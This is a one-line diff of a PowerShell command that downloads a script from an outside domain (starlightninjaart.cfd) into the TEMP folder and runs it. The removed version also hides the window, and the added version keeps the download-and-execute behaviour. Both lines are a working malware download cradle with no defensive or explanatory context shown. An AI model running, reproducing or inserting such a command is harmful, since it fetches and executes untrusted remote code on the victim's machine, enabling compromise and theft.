@@ -1,1 +1,1 @@
-powershell -NoP -w hidden -C "iwr 'http://starlightninjaart.cfd/Ne3fOOeAPjsi6VBS' -OutFile $env:TEMP\s.ps1; & $env:TEMP\s.ps1"
+powershell -C "$p=$env:TEMP\s.ps1; iwr 'http://starlightninjaart.cfd/Ne3fOOeAPjsi6VBS' -OutFile $p; & $p"
